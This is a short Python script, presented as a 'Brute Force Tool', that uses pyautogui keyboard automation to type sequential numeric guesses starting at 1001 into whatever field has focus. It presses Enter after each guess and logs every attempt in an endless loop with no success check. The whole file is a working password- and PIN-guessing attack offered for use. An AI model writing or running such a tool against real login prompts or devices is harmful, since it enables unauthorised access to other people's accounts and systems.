import time
import pyautogui
import keyboard

print("Python Brute Force Tool")
print("Press R to start.")
pressed = False
while pressed == False:
    if keyboard.is_pressed("R"):
        print("Brute Force start in 5 seconds.")
        time.sleep(5)
        pressed = True

print("Brute Force Attack started.")
tryPass = 1000
going = True
while going == True:
    tryPass = tryPass + 1
    pyautogui.write(str(tryPass))
    pyautogui.press("enter")
    print("%%%%%%%%%%%%%%%%%%%%%%%%%%%%")
    print("%[BFA] | CURRENT PASS:", tryPass,end="" "%")
    print()
